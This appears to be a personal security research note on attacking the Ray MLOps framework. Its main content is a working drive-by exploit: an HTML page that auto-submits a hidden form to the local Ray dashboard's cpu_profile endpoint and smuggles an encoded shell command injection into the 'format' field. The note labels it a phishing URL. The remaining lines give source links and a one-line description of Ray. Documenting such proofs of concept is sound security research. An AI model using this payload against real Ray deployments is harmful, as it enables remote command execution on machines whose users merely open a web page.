---
aliases: 
tags:
  - MLops-attack
  - ART
last_tested: 08/2023
transferable:
---


## **PoC**
Ray is at its core a tool for arbitrary code execution! 
Command execution via API by anyone on the network
**Phishing URL to codex:** 

```
<html>
<body>
<form action="http://localhost:8265/worker/cpu_profile">
<input type="hidden" name="pid" value="66758" />
<input type="hidden" name="ip" value="192&#46;168&#46;1&#46;5" />
<input type="hidden" name="duration" value="5" />
<input type="hidden" name="native" value="0" />
<input type="hidden" name="format" value="&#96;&#59;&#96;touch&#32;&#47;tmp&#47;driveby&#96;" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>

```
## **Details**
Source: twitter.com/danhmcinerney 
https://hackstery.com/2023/10/13/no-one-is-prefect-is-your-mlops-infrastructure-leaking-secrets/ 
A python lib with a UI, includes some java. Scales out resources for creating models

	
[Video](https://www.youtube.com/watch?v=e3ybnXjtpIc)
[Paper](https://arxiv.org/abs/2302.10149) 
### ATT&CK Matrix